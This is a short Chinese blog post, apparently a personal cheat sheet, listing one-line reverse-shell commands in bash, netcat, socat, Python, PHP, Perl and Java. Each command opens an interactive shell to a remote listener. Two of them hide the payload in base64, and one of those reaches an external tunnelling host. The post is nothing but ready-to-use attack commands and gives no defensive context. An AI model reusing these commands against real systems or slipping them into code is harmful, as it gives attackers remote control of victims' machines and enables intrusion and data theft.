---
title: "一句话反弹shell"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:40:20+08:00
draft: false
---

```text
bash -i >& /dev/tcp/192.168.31.41/8080 0>&1
```

```text
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9zZXJ2ZXIubmF0YXBwZnJlZS5jYy80NTQwMCAwPiYx}|{base64,-d}|{bash,-i}
```

```text
netcat 192.168.31.174 8080 -e /bin/bash
```

```text
nc 192.168.31.174 8080 -t -e /bin/bash
```

```text
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.31.174：12345
```

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```text
php -r '$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```java
Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}");
```

```text
perl -e 'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
